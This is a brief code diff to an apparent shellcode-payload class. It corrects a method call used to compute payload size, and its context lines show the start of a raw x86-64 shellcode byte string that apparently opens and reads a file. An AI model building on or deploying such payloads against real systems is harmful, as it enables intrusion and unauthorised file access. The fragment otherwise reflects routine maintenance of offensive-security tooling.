@@ -9,7 +9,7 @@ class Payload(Shellcode):
     ]
 
     def __init__(self, **kwargs): 
-        Shellcode.info["size"] = 82 + Shellcode.getsize(kwargs["file"])
+        Shellcode.info["size"] = 82 + Shellcode().getsize(kwargs["file"])
         Shellcode.info["payload"] = [
             r"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31"
             r"\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89"
